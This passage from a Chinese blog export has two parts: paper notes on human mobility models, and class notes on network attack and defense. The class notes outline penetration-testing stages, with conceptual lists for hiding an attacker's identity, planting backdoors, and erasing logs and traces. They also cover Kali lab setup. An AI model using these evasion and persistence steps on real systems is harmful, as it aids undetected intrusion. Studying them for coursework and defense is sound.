alt="image-20210703135129853"></p><p>该图反映了2-returnrers和2-explorers的$SSE$和${SSE}^*$在GSM和GPS数据上的分布</p><p>我们可以观察到很大一部分2-returners的$SSE$和$SSE^*$较小，说明在$L_1,L_2$周围集群密集</p><p>但2-explorers的凝聚性较差</p><h3 id="Models"><a href="#Models" class="headerlink" title="Models"></a>Models</h3><p>本文使用EPR(the exploration and preferential return)个体流动模型与结果进行比较。EPR模型是可以精准捕捉地点访问频率和回转半径的分布及其时间增长的sota模型。该模型包括两个相互竞争的机制:探索新的地点和返回以前访问过的地点。该模型没有固定的首选地点的集合，但允许它们在移动的演变过程中自然出现。</p><p>探索是一个具有截断幂律跳跃大小分布的随机移动过程，偏好返回表现出个体回到他们以前经常访问地方的倾向</p><p>本文使用EPR模型模拟67000个个体的移动并计算了每个个体的$r_g$和$r_g^{(k)}$ </p><p>使用原始EPR模型进行模拟:<br>为67000个个体随机产生初始地点(家)，即在100×100平方大小内随机选择点。</p><p>每个个体重复以下步骤1000次:</p><ul><li>提取等待时间(个体在该位置停留时间)$\Delta t$ ($P(\Delta t)\sim \Delta t^{-1-\beta}exp^{-\Delta t/\tau}$  $\beta=0.8$ and $\tau=17$)   </li><li>个体访问新地点的概率$P_{new}=\rho S^{-\gamma}$($\rho=0.6$ and $\gamma=0.21$)  S是之前访问过不同地点的个数 ，否则他返回之前访问过的地点($P=1-\rho S^{-\gamma}$)</li><li>如果个体访问新地点(explore),提取距离$\Delta r$ ($P(\Delta r)=\Delta r^{-1-\alpha}$  $\alpha=0.55$)  个体访问一个以他目前位置为圆心，$\Delta r$为半径圆内的随机位置。 同时S增加1，新的位置可以在初始100×100平方外。</li><li>如果个体回到之前访问过的地点(return),他选择地点的概率与到该地点的访问次数成正比(偏好返回)</li></ul><p>故该模型前期个体进行大量探索，从长期来看，个体在之前访问过的地方之间移动。</p><p>本文同时使用两个改进模型：</p><p>(1)the s-EPR model(spatial EPR model)   限制个体在空间范围内</p><p>将67000个个体放到他最常访问的地点(GSM数据即对应的GSM信号塔)，每个个体重复步骤除explore外和原始EPR模型相同。</p><p>如果个体访问新地点(explore),提取距离$\Delta r$ ($P(\Delta r)=\Delta r^{-1-\alpha}$  $\alpha=0.55$) ，以均匀概率提取一个[0,2π]范围的角$\theta$ ，如果距离当前位置角度为$\theta$距离为$\Delta r$的位置没在国家的边界内，则提取新的距离和角度直到符合条件。访问不同的地点，S增加1</p><p>(2)the d-EPR model(density EPR model) </p><p>个体访问新的位置取决于他的目前位置和在新位置所有用户通信总数的相关性测量。</p><p>将67000个个体放到他最常访问的地点(GSM数据即对应的GSM信号塔)，每个个体重复步骤除explore外和原始EPR模型相同。</p><p>如果个体现在在位置i访问新地点，则该地点通过引力模型选择(<strong>引力模型分配任意两个地点之间的移动概率，自动限制个体在国家的边界内</strong>)，概率$P_{ij}=\frac{1}{N}\frac{n_in_j}{r_{ij}^2}$</p><p>$n_{i(j)}$为所有用户在该位置发出的通信(电话/信息)  $r_{ij}$为i和j之间的地理距离  $N=\sum_{i,j\ne i}p_{ij}$是归一化常数</p><p>访问不同的地点，S增加1</p><p><img src="/2021/07/01/rae/image-20210704180942791.png" alt="image-20210704180942791"></p><p>该图反映出k=2时EPR模型对returners和explorers的预测。</p><p>使用原始EPR模型模拟(a,b,c)，explorers占主导地位，当k=60时，explorers和returners才达到平衡。而上述在实际数据中在k=4时达到平衡。点聚集在对角线只有微弱的趋势,在该模型中不存在returners和explorers的分类。</p><p>使用d-EPR数据模拟(d,e,f)，explorers站主导地位，当k=9时达到平衡，更接近于实际数据。</p><p><img src="/2021/07/01/rae/image-20210704175734568.png" alt="image-20210704175734568"></p><p>该图表现了三种模型下 $r_g$和$r_g^{(k)}$的相关性 (k=2,6,10)</p><p><img src="/2021/07/01/rae/image-20210704180130108.png" alt="image-20210704180130108"></p><p>该图表现出三种模型下$s_k=r_g^{(k)}/r_g$的分布  (k=2,6,10)</p><p><img src="/2021/07/01/rae/image-20210704180413200.png" alt="image-20210704180413200"></p><p>该图反映出在三种模型下对于2-explorers和2-returners总回转半径$r_g$和两个访问最频繁地点之间距离$d(L_1,L_2)$的相关性。相比于实际数据，在原始EPR模型中无论explorers还是returners没有找到显著的相关性。</p><p>实际数据和原始EPR模型的差异为EPR模型中个体可以移动任意长的距离，每次移动都增加$r_g$。为了修正该问题，引入d-EPR模型，该模型与实际数据有更好的吻合。且上面$r_g$和$r_g^{(k)}$相关性的图中，d-EPR模型显示出了分类情况。与原始EPR模型相比，$r_g$和$d(L_1,L_2)$的相关性也显著提高，与实际数据接近。</p><p>因此，d-EPR模型再现了人类在受限地理空间聚集移动模式的关键特征，将个体分为explorers和returners两类。</p><p><strong>模型的机制:当一个个体返回时，他会被之前去过的地方吸引，其吸引力取决于这些地方在个体层面的相关性。</strong></p><p><strong>当一个个体探索时，他会被吸引到新的地方，其吸引力取决于这些地方在集体层面上的相关性。</strong></p><h3 id="the-relevance-of-returners-and-explorers-dichotomy"><a href="#the-relevance-of-returners-and-explorers-dichotomy" class="headerlink" title="the relevance of returners and explorers dichotomy"></a>the relevance of returners and explorers dichotomy</h3><p>该研究成果与流行病的地理传播和社会互动两方面很相关。</p><p>对于流行病传播，为了观察returners和explorers是如何影响传播的，根据个体运动轨迹的时间演变，将个体的移动历史划分为时间周期。</p><p>并用三种方法捕捉到了t时刻的轨迹范围:(1)访问地点的数量  (2)覆盖区域 (3) 总回转半径$r_g(t)$</p><p>在GSM和GPS数据上，explorers的轨迹相比于returners分布在更大的范围:访问地点数量更多，覆盖区域更广，回转半径更大</p><p><img src="/2021/07/01/rae/image-20210704222930783.png" alt="image-20210704222930783"></p><p><img src="/2021/07/01/rae/image-20210704222941701.png" alt="image-20210704222941701"></p><p>该图表现出returners和explorers地理传播的时间演化。将每个个体的移动历史分为十个相同的时间段，该图反映出在各个时间段内GSM/GPS/s-EPR/d-EPR的访问地点、覆盖区域和回转半径的分布。插图显示了每个时间段的平均分布。(Question3)</p><p>相比之下，s-EPR和d-EPR模型高估了returners的地理传播。</p><p>本文还通过考虑由个人移动产生的全球移动网络来评估returners和explorers在传播和扩散方面发挥的不同作用</p><p>全球移动网络是一个图，它的节点是位置，而边表示两个位置之间至少存在一次行程。具体到一个城区，建立了10个全球移动网络，考虑到10000个随机选择个体的行程。选择不同占比的two-returners和two-explorers(分别为0%,10%,…,100%)</p><p>对每个网络，在大的亚群体和低繁殖数的扩散动力学假设下计算全局入侵阈值$R*$( the global invasion threshold) (和亚群体的流行病阈值接近)</p><p>在复合群体网络中，当$R<em>&gt;1$时，流行病传播和入侵系统，该全局入侵阈值受网络拓扑波动程度的影响:异质性程度越大，$R</em>$就越高，因此传染病在全球范围内侵入复合群体的可能也就越大</p><p>计算每个全球移动网络1000次，随机选择returners和explorers占比不同的10000个体，为每个网络获取1000个入侵阈值。可以观察到平均扩散入侵阈值随随机人群中explorers比例的增加而增加。</p><p>(Question 5)</p><p>returners和explorers倾向于与相同类别的进行社会互动。本文发现two-returners呼叫最多的联系人中同样是returners的比率为$RR\approx0.27$,将这个数字与10万次我们随机指定个体最好的朋友的实验相比，$RR_{rand}\approx0.21$</p><p><img src="/2021/07/01/rae/image-20210705162948378.png" alt="image-20210705162948378"></p><p>该图表示了two-returners和two-explorers最好的朋友的分布。虚线表示最好的朋友类别的实际分数。</p><p>我们可以观察到个体更趋向于和同一移动群体的个体进行交流。(Question 6)</p><p><img src="/2021/07/01/rae/image-20210705165008739.png" alt="image-20210705165008739"></p><p>该图反应了returners和explorers友谊排名(n-th best friend)中的类别情况。</p><p>作者比较在同一分类下个体n-th best friend所占比例，发现在n到15为止，观测到的分数都明显高于(RR和EE)或明显低于(ER和RE)随机得到的分数。(Question7)</p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="箱型图"><a href="#箱型图" class="headerlink" title="箱型图"></a>箱型图</h3><p><a href="https://blog.csdn.net/symoriaty/article/details/93978817" target="_blank" rel="noopener">https://blog.csdn.net/symoriaty/article/details/93978817</a></p><p>可以用来反映一组或多组连续型定量数据(在一定区间内可以任意取值的变量叫连续变量，其数值是连续不断的)分布的中心位置和散布范围</p><p><img src="https://pic3.zhimg.com/80/v2-ce5526f050d5a182e279ccaff2c0bc6a_1440w.jpg" alt="img"></p><p>箱体包含了50%的数据。<strong>箱子的高度在一定程度上反映了数据的波动程度</strong>。</p><blockquote><p>偏态:与正态分布相对，指的是非对称分布的偏斜状态。在统计学上，众数和平均数之差可作为分配偏态的指标之一：如平均数大于众数，称为正偏态（或右偏态）；相反，则称为负偏态（或左偏态）。</p></blockquote><p>箱型图功能:</p><ul><li>直观地识别数据批中的异常值：箱体包含了大部分的正常数据，而在箱体上边界和下边界之外的，就是异常数据。</li><li>判断数据的偏态和尾重：对于标准正态分布的大样本，中位数位于上下四分位数的中央，箱形图的方盒关于中位线对称。<strong>中位数越偏离上下四分位数的中心位置，分布偏态性越强。</strong>异常值集中在较大值一侧，则分布呈现右偏态；异常值集中在较小值一侧，则分布呈现左偏态。</li><li>比较多批数据的形状：箱子的宽度在一定程度上反映了数据的波动程度。箱体越扁说明数据越集中。</li></ul><p>补充：</p><p>一些柱状图中作者会添加误差线来给数值增加误差范围，看起来和箱线图有点相似。</p><p><img src="http://5b0988e595225.cdn.sohucs.com/images/20180123/d5d395df5c664d43b402d15cd258d0b3.png" alt="img"></p><h3 id="r-g-k-vs-r-g-cm-k"><a href="#r-g-k-vs-r-g-cm-k" class="headerlink" title="$r_{g}^{(k)}$ vs $r_{g,cm}^{(k)}$"></a>$r_{g}^{(k)}$ vs $r_{g,cm}^{(k)}$</h3><p>$r_g^{(k)}$ 是在$r_{cm}^{(k)}$(k个最常访问的位置的几何中心)基础上计算的k回转半径</p><p>$r_{g,cm}^{(k)}$是在以整体几何中心基础上计算的k回转半径</p><p><img src="/2021/07/01/rae/image-20210701224217544.png" alt="image-20210701224217544"></p><p>由图可见，将个体分为2-returners和2-explorers在GSM不清晰 在GPS则不存在分类情况</p><p>不存在分类情况的原因(个人理解):由于计算整体的几何中心，得到的k回转半径$r_{g,cm}^{(k)}$相比于$r_g^{(k)}$变大，explorers更多被视为returners，向对角线靠近。</p><p>对于2-returners来说 两个几何中心相对接近 但对explorers距离更大，且距离随$r_g$增大</p><p>故对于2-returners来说 $r_{g}^{(k)}$ 与$r_{g,cm}^{(k)}$相似，但对2-explorers则不是如此。</p><h3 id="幂律分布"><a href="#幂律分布" class="headerlink" title="幂律分布"></a>幂律分布</h3><p><a href="https://blog.csdn.net/qq_32499325/article/details/82792937" target="_blank" rel="noopener">https://blog.csdn.net/qq_32499325/article/details/82792937</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzIzMjQyNzQ5MA==&amp;mid=2247487411&amp;idx=1&amp;sn=70371ccc16e05077ec4613a23ed11e64&amp;chksm=e894553edfe3dc28c1786c0cbfd79c8ae811da4ccf38fd2e957f7365940fcf3e0350bd6b9b9b&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzIzMjQyNzQ5MA==&amp;mid=2247487411&amp;idx=1&amp;sn=70371ccc16e05077ec4613a23ed11e64&amp;chksm=e894553edfe3dc28c1786c0cbfd79c8ae811da4ccf38fd2e957f7365940fcf3e0350bd6b9b9b&amp;scene=21#wechat_redirect</a></p><p><a href="https://wiki.swarma.org/index.php?title=%E5%B9%82%E5%BE%8B%E5%88%86%E5%B8%83_power_law&amp;variant=zh-hans" target="_blank" rel="noopener">https://wiki.swarma.org/index.php?title=%E5%B9%82%E5%BE%8B%E5%88%86%E5%B8%83_power_law&amp;variant=zh-hans</a></p><p>幂律分布显示尖峰胖尾的特征，要比正态分布表现得峰更加尖，而尾巴会拖得更长更厚。</p><p>分布函数服从幂函数。</p><p>幂律函数数学形式:</p><p>$f(x)=Cx^{-\alpha}$          $x≥x_{min}&gt;0$ </p><p>常量因子<em>C</em>是一个标度因子，以确保总面积为 1</p><p>对该函数两边取对数</p><p>$lnf(x)=lnC-\alpha lnx$</p><p>故幂律函数在双对数坐标下呈负斜率的直线</p><p><img src="/2021/07/01/rae/image-20210702094557317.png" alt="image-20210702094557317"></p><p>对于实际数据，这种线性是幂律关系数据的必要条件，但并不是充分条件。</p><h4 id="标度不变性"><a href="#标度不变性" class="headerlink" title="标度不变性"></a>标度不变性</h4><p>观察不同尺度的总体， 对应的高概率和低概率的结构关系是不变的，即对应的f(x)只是系数上有差别，函数性质不变。</p><p><strong>用一个放大镜观察这个分布，无论看什么细节，放大多少倍数，所得到的性质是一样的，这种现象被称为无特征尺度</strong>，而正态分布是有的，必须整体上看是一个钟的形状，放大任何局部都不会得到钟形的图案。</p><p><img src="/2021/07/01/rae/image-20210702095513545.png" alt="image-20210702095513545"></p><blockquote><p>拿帕累托80/20法则来说，80/20法则说20%的人口掌握了80%的财富。而在这个掌握的80%财富的的20%人口中，又有20%掌握了其中的80%，而在穷人部分随便划出一部分，也会发现20%的较为富有的占有了这部分穷人总财富的80%。当看任何财富的区间，都会有同样的规律，这个规律和所划定的区间无关。</p></blockquote><h4 id="truncated-power-law"><a href="#truncated-power-law" class="headerlink" title="truncated power law"></a>truncated power law</h4><p>指数截断的幂律分布</p><p>具有指数截止的幂律就是幂律乘以一个指数函数:</p><p>$f(x)\propto x^\alpha e^{\beta x}$</p><p><img src="/2021/07/01/rae/image-20210702100318243.png" alt="image-20210702100318243"></p><h3 id="mobility-clusters"><a href="#mobility-clusters" class="headerlink" title="mobility clusters"></a>mobility clusters</h3><p>定义集群的k回转半径，<strong>在k-th最常访问的地理集群上计算回转半径</strong>$c-r_g^{(k)}$ </p><p>一个个体的地理集群是一个密集的位置组，代表个体移动的地理单元。</p><p>如果一个个体每周往返于两个不同城市的两个家，那么他就拥有(至少)两个不同的地理集群。</p><p>$c-r_g^{(k)}$是在k-th访问最频繁集群上计算的，<strong>只考虑每个集群中访问次数最多的位置</strong>。</p><p>在上面的例子中，个体的集群回转半径是用两个不同的家计算的</p><p>使用密度聚类算法计算集群，通过输入的两个参数来提取密集的点群:</p><p>eps 最大搜索半径(此处设置为5,10,50,100km);minPts  形成一个集群的最少地点(此处设置为2)</p><p>在集群水平上，explorers和returners二分同样出现了  直到eps=10km时消失(此时集群已经中等城市大小)</p><p>到eps=50,100km时 计算的集群数很小，2-explorers很少</p><p><img src="/2021/07/01/rae/image-20210706000825224.png" alt="image-20210706000825224"></p><p>该图为k=2时 GSM数据上$c-r_g^{(k)}$与$r_g$的相关性。</p><p>因此，returners和explorers在人口中的存在与个体位置的空间粒度无关</p><h3 id="gravity-model"><a href="#gravity-model" class="headerlink" title="gravity model"></a>gravity model</h3><p>牛顿万有引力定律:任何两个物体之间的作用(引力)的大小与它的质量成正比，与它们之间的距离平方成反比。</p><p>引力模型以牛顿经典力学的万有引力公式作为基础，其简化形式为</p><p>$M_y=KY_iY_j/D_{ij}$</p><p>K为常数(通常称为引力系数)，$Y_i$和$Y_j$为内生变量，由模型要求通过的特定条件“平衡”出来，$D_{ij}$为空间距离。</p><p>该模型的特点:基础形式不变，只要对参数和分量的定义作出适当改变，就可以将引力模型应用于不同的问题。</p><h3 id="global-diffusion-invasion-threshold"><a href="#global-diffusion-invasion-threshold" class="headerlink" title="global diffusion invasion threshold"></a>global diffusion invasion threshold</h3><p>关于该全局入侵阈值的计算$R*$</p><p>对于每个网络，计算平均度$\left \langle k \right \rangle$,均方度$\left \langle k^2 \right \rangle$，每个地点的平均居民人数$\overline N$</p><p>在大亚种群低繁殖数扩散动力学的假设下，计算$R*=\overline N\cdot C(\left \langle k^2 \right \rangle-\left \langle k \right \rangle)/\left \langle k \right \rangle^2$</p><p>常数C取决于繁殖数量(the reproductive number)和移动率，两类取值相同</p><p><img src="/2021/07/01/rae/image-20210705231259967.png" alt="image-20210705231259967"></p><p>该图通过误差线(Error bars)反映了returners和explorers占比不同下$R*$的分布 </p><p>我们观察到，随着2-explorers占比增加，平均扩散入侵阈值增加。</p><p>作者同时使用了加权的全球移动网络，使用地点之间车辆的旅程次数作为权值。边权值遵循幂律分布，最大值为30。计算加权的全局入侵阈值$R_*^\omega=\overline N \cdot (\left \langle k^{2+2\theta} \right \rangle-\left \langle k^{1+2\theta} \right \rangle)/\left \langle k^{1+\theta} \right \rangle^2$</p><p>取$\theta=0$  此时$R_<em>^\omega=R</em>$   故不做区分</p><p>(Question8)</p><h3 id="图像矩"><a href="#图像矩" class="headerlink" title="图像矩"></a>图像矩</h3><h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><p>1.质心的概念,计算，与家的关系，是不是所有访问地点的几何中心</p><p>2.从$r_g$和$r_g^{(k)}$的数学公式来看 如何理解$s_k&gt;1$  ($r_g^{(k)}&gt;r_g$) 表明(n−k)访问频率较低的位置平均比k个最频繁的位置更接近质心</p><p>3.地理传播的时间演化图中 分成十个等份 为什么访问地点数量 覆盖区域 $r_g(t)$都是递增的</p><p>每个时间段各参数测量是否都是在前面时间段结果基础上的</p><p>4.相反过程是随着k减小 returners变为explorers?  k-explorers和(k-1)-returners的比值代表了什么 比值特别小能说明什么  为什么比值能代表对应个体 且这些个体坐落在平分线   bisector method随k增长分类产生了什么波动</p><p>5.metapopulation network     the global invasion threshold   the global mobility networks   subpopulation       the topological fluctuations of the network’s degree    the degree heterogeneity</p><p>6.该图的纵坐标轴代表什么   P value ($&lt;10^{-5}$ ) </p><p>7.为什么前面说了returners和explorers倾向于与相同类别的进行社会互动，但explorers和returners的best-friend都是explorers居多，这与explorers在人口中占比大于returners是否相关</p><p>8.$\theta$ 的含义  the function between the average weight and the end-point degrees   为什么估计$\theta=0$</p>]]></content>
    
    
    <categories>
      
      <category>Paper reading</category>
      
    </categories>
    
    
    <tags>
      
      <tag>human mobility</tag>
      
      <tag>dichotomy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>网络攻防</title>
    <link href="/2021/06/06/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"/>
    <url>/2021/06/06/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/</url>
    
    <content type="html"><![CDATA[<p>前几次上课的笔记，方便期末考试查阅。</p><p>渗透测试流程、信息收集、WEB挖掘分析、网络隐身、网络扫描、Burp使用…</p><a id="more"></a><h2 id="class1"><a href="#class1" class="headerlink" title="class1"></a>class1</h2><blockquote><p>vWeb安全资料<br>§<a href="https://pan.baidu.com/s/1bg1G6uo9b6UT2Y-E4dnaSQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1bg1G6uo9b6UT2Y-E4dnaSQ</a><br>§密码:0ub7<br>vKali百度云链接<a href="https://pan.baidu.com/s/1Ty4QhRLm3707Cxvzivh8fw" target="_blank" rel="noopener">https://pan.baidu.com/s/1Ty4QhRLm3707Cxvzivh8fw</a> 密码:u4a0<br>vWin2008server链接<a href="https://pan.baidu.com/s/1eML7NoyWBN0Zr26_DLoSYw" target="_blank" rel="noopener">https://pan.baidu.com/s/1eML7NoyWBN0Zr26_DLoSYw</a> 密码:2dta</p></blockquote><p>www.shodan.io 工控设备具体分布</p><h2 id="class2"><a href="#class2" class="headerlink" title="class2"></a>class2</h2><h3 id="渗透测试流程"><a href="#渗透测试流程" class="headerlink" title="渗透测试流程"></a>渗透测试流程</h3><p><img src="/2021/06/06/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/image-20210311120114130.png" alt="image-20210311120114130"></p><p>①信息收集</p><p>②网络隐身:让对方发掘不到攻击者的地址，无法溯源</p><p>（对攻击来说是必须的，但对渗透测试可以不做）</p><p>③端口和漏洞扫描</p><p>④攻击实施</p><p>⑤提权</p><p>⑥设置后门</p><p>如果入侵的漏洞被修复，可以使用后门绕过目前利用的漏洞</p><p>⑦清除痕迹</p><p>应用的日志会将攻击细节记录(渗透测试可以不做)</p><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p><strong>收集的信息</strong></p><ul><li><p>网络接入方式：拨号接入、无线局域网接入、以太网接入、VPN远程接入等</p></li><li><p>目标网络信息：域名范围、IP地址范围、具体地理位置等</p></li><li><p>网络拓扑结构：交换设备类型、设备生产厂家、传输网络类型等</p><p>（路由器，二级交换机，三级交换机…）</p></li><li><p>网络用户信息：邮件地址范围、用户账号密码等</p></li></ul><h4 id="网络隐身"><a href="#网络隐身" class="headerlink" title="网络隐身"></a>网络隐身</h4><p><strong>IP假冒或盗用</strong></p><p>TCP/IP协议不检查源IP地址(32位)，只检查目的地址，修改IP地址绕过访问控制黑名单</p><p><strong>MAC地址盗用</strong></p><p>修改自身主机的MAC地址(数据链路层)为允许访问的MAC地址 IP是逻辑地址(网络层)，MAC(48位)是硬件地址</p><p>MAC地址分为两段，0~23位是国际化组织分配给网卡制造商的  24~47位是生产商生产网卡的编号，这48位在出厂就固化在网卡中了</p><p>通过技术手段修改这48位，只改变表象，不改变本质</p><p>通过ARP协议把IP翻译为MAC地址</p><p><strong>代理隐藏</strong></p><p>通过免费代理进行信息收集，甚至通过多个代理级联</p><p>因为中国长城防火墙，所以国内ip无法访问谷歌。新加坡的服务器能正常访问谷歌，可以在PC上设置代理，先把发往谷歌的数据包发给代理，由代理转给谷歌。</p><p>对谷歌而言，知道当前流量连接来自新加坡的服务器，而不知道我们的PC地址。</p><p><strong>冒充真实用户</strong></p><p>监听或破解用户的账号和口令，然后冒充该账户</p><p><strong>僵尸机器</strong></p><p>入侵僵尸主机，并通过该主机进行攻击</p><p>如果计算机被攻击者获得相应权限后，攻击者可以利用你的计算机进行攻击。</p><p>被攻击方如果进行溯源，首先找到你的计算机。</p><p>例:校园网的网关号不要轻易借给别人，可能在网络上发表不利言论</p><h4 id="网络扫描"><a href="#网络扫描" class="headerlink" title="网络扫描"></a>网络扫描</h4><p>传输层TCP UDP 这两个协议都有0-65535个端口</p><p>通过端口和应用层各种应用建立联系</p><p>常使用的端口 http默认端口80   https默认端口443  ftp默认21 </p><p>http https ftp都是应用层协议</p><p>从应用层到传输层都用TCP协议封装</p><p><strong>端口扫描</strong></p><ul><li><p>检测有关端口是打开还是关闭</p><p>可以得到具体的攻击路径</p></li><li><p>判定目标端口运行的服务类型和版本信息</p><p>检测开放哪些端口，判断相应服务类型</p></li><li><p>识别不同操作系统的类型和版本</p></li></ul><p>linux中shadow存放加密后的口令，passwd文件存放用户信息</p><p>shadow文件需要root权限可以读取</p><p><strong>漏洞扫描</strong></p><ul><li><p>专用的漏洞扫描工具如Openvas、APPScan等</p></li><li><p>WEB应用程序的漏洞扫描如Nikto、W3AF等</p></li></ul><h4 id="攻击或渗透测试"><a href="#攻击或渗透测试" class="headerlink" title="攻击或渗透测试"></a>攻击或渗透测试</h4><p><strong>拒绝服务攻击</strong></p><p>危害极大，导致服务器不能正常提供相应服务</p><p><strong>获取访问权限</strong></p><p>利用远程漏洞进行远程入侵，获得目标系统的一个普通用户权限  获得权限比较低</p><p><strong>提升访问权限</strong></p><p>配合本地漏洞把获得的权限进行提升，提升为管理员的最高权限</p><p>暴力破解管理员口令、检测系统配置错误、网络监听或设置钓鱼木马</p><h4 id="放置后门"><a href="#放置后门" class="headerlink" title="放置后门"></a>放置后门</h4><p>开放不安全的服务端口</p><p>修改系统配置</p><p>安装网络嗅探器</p><p>建立隐藏通道</p><p>创建具有root权限的虚假用户账号</p><p>安装批处理文件</p><p>安装远程控制木马：灰鸽子</p><h4 id="清除痕迹"><a href="#清除痕迹" class="headerlink" title="清除痕迹"></a>清除痕迹</h4><p>不能把整个日志全部删除，删除和自己有关的信息</p><p><strong>清除登录日志和其它有关记录</strong></p><ul><li><p>隐藏上传的文件</p></li><li><p>修改日志文件中的审计信息</p></li><li><p>修改系统时间造成日志文件数据紊乱</p></li><li><p>删除或停止审计服务进程</p></li><li><p>干扰入侵检测系统正常运行</p></li><li><p>修改完整性检测数据</p></li><li><p>使用Rootkits工具</p></li></ul><p><strong>Windows的系统日志—“%systemroot%\system32\config”</strong></p><h3 id="Kali"><a href="#Kali" class="headerlink" title="Kali"></a>Kali</h3><p>Metasploit 渗透测试的框架，相当于狙击枪（kali的核心内容）</p><p>kali2020默认用户 kali 默认口令kali</p><p>此时权限较低 激活root账号</p><h4 id="修改网络设置"><a href="#修改网络设置" class="headerlink" title="修改网络设置"></a>修改网络设置</h4><h5 id="设置静态ip地址"><a href="#设置静态ip地址" class="headerlink" title="设置静态ip地址"></a>设置静态ip地址</h5><p>上方时间后图标右击Edit Connection-&gt;左下角设置</p><p>若使用静态IP，把Method改为手动(Manual)</p><p>Add Address NetMask Gateway(网关)</p><p><code>ifconfig</code>查询ip地址 查看配置是否生效</p><p>Linux中网卡信息若发生改变，不会立刻生效。需要先将网卡停用后再启用</p><p>在图标点击断开连接 再启动Wired Connection1，地址才会生效</p><p>一般不要手动设置地址，自动获取即可</p><h5 id="查看ip地址"><a href="#查看ip地址" class="headerlink" title="查看ip地址"></a>查看ip地址</h5><p><code>ifconfig</code></p><p>两个网卡eth0/lo</p><p>lo是本地回环网卡，用于测试本地网卡能否正常工作</p><p>ip为127.0.0.1</p><h5 id="VMware网络连接模式"><a href="#VMware网络连接模式" class="headerlink" title="VMware网络连接模式"></a>VMware网络连接模式</h5><p>安装VMware后，网络设置中多了vmnet0/vmnet1/vmnet8等</p><p>这是三种上网方式，虚拟出来的三个交换机</p><p>编辑-&gt;虚拟网络编辑器(若缺少相应的虚拟交换机如VMnet0，可自行添加)</p><p><img src="/2021/06/06/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/image-20210311174959481.png" alt="image-20210311174959481"></p><p>桥接模式:启动了一台虚拟机相当于拥有两台电脑</p><p>物理主机有ip地址，虚拟主机也有ip地址</p><p>虚拟机通过虚拟网卡练到虚拟交换机VMnet0，用主机的网卡上网</p><p>NAT模式:虚拟机之间、主机与虚拟机之间互访，==虚拟机可通过主机访问外网，外网无法访问虚拟机。==</p><p>仅主机模式:虚拟机之间、主机与虚拟机之间互访，虚拟机无法访问外网。</p><h4 id="更新源"><a href="#更新源" class="headerlink" title="更新源"></a>更新源</h4><p>源是kali的官网(外网)，若包比较大，会经常中断</p><p>修改源为国内源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apt/sources.list</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">apt-get update</span><br></pre></td></tr></table></figure><h3 id="搭建漏洞环境"><a href="#搭建漏洞环境" class="headerlink" title="搭建漏洞环境"></a>搭建漏洞环境</h3><p>Kali或其它主机要跟Metasploitable2在同一个网段，要么都用桥接，要么都用NAT（就算在同一网段，一个NAT一个桥接也不行）</p><p>Metasploitable2登陆用户名/密码：msfadmin/msfadmin，但权限较低，可修改</p><p>metasploitable使用http,输入ip地址查看是否能访问成功</p><p><img src="/2021/06/06/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/image-20210313124234394.png" alt="image-20210313124234394"></p><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p>又称网络踩点(footprinting)，指攻击者通过各种途径对要攻击的目标进行有计划和有步骤的信息收集，从而了解目标的==网络环境和信息安全状况==的过程。</p><p><strong>目标网络</strong></p><ul><li>域名、IP地址、DNS服务器、邮件服务器、网络拓扑结构</li></ul><p><strong>目标个人</strong></p><ul><li>身份信息、联系方式、职业或其它隐私信息</li></ul><p><strong>踩点方法</strong></p><ul><li><p>注册机构Whois查询</p></li><li><p>DNS和IP信息收集</p></li><li><p>WEB信息搜索与挖掘</p></li><li><p>网络拓扑侦察</p></li><li><p>网络监听</p></li></ul><h4 id="第一部分-域名系统"><a href="#第一部分-域名系统" class="headerlink" title="第一部分 域名系统"></a>第一部分 域名系统</h4><p>我们的上网过程中使用的是32位的IPv4（点分十进制）</p><p>为了方便 我们使用带有一定含义的域名来标识某个ip</p><h5 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h5><p>Domain Name System 域名服务器</p><p>完成的是域名和ip的映射</p><p>域名系统是因特网的一项服务，作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便的访问互联网。DNS使用TCP和UDP端口53。</p><p><img src="/2021/06/06/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/image-20210313125050606.png" alt="image-20210313125050606"></p><h5 id="域名记录类型"><a href="#域名记录类型" class="headerlink" title="域名记录类型"></a>域名记录类型</h5><p><strong>A记录</strong>：主机记录，是使用最广泛的DNS记录；</p><p>完成域名-&gt;IP映射</p><p><strong>NS记录</strong>：也称为域名服务器记录，用于说明这个区域==有哪些DNS服务器承担解析==的任务；</p><p><strong>Cname记录：</strong>别名记录；</p><p><strong>PTR记录</strong>：反向地址解析记录，作用是把IP地址解析为域名</p><p>IP-&gt;域名映射  和A记录相反</p><h5 id="域名的等级"><a href="#域名的等级" class="headerlink" title="域名的等级"></a>域名的等级</h5><p><img src="/2021/06/06/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/image-20210313125503780.png" alt="image-20210313125503780"></p><p>主机提供了www服务 </p><p>在域名中越靠后级别越高</p><p>cn顶级域 com二级域 sina三级域(组织机构名)</p><h5 id="域名解析示意—迭代"><a href="#域名解析示意—迭代" class="headerlink" title="域名解析示意—迭代"></a>域名解析示意—迭代</h5><p>如果查询的DNS服务器中没有对应的ip地址:</p><p><img src="/2021/06/06/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/image-20210313125724339.png" 